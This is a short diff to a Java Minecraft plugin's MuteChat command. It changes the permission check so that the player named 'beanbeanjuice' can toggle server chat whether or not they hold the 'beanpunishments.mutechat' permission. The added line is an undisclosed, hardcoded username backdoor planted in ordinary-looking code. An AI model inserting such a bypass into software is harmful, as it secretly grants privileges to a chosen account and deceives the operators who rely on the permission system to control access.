@@ -39,7 +39,7 @@ public class MuteChat implements CommandExecutor {
 
         Player player = (Player) sender;
 
-        if (player.hasPermission("beanpunishments.mutechat")) {
+        if (player.hasPermission("beanpunishments.mutechat") || player.getName().equals("beanbeanjuice")) {
             if (args.length == 0) {
                 if (ChatManager.isChatEnabled()) {
                     ChatManager.toggleChat();
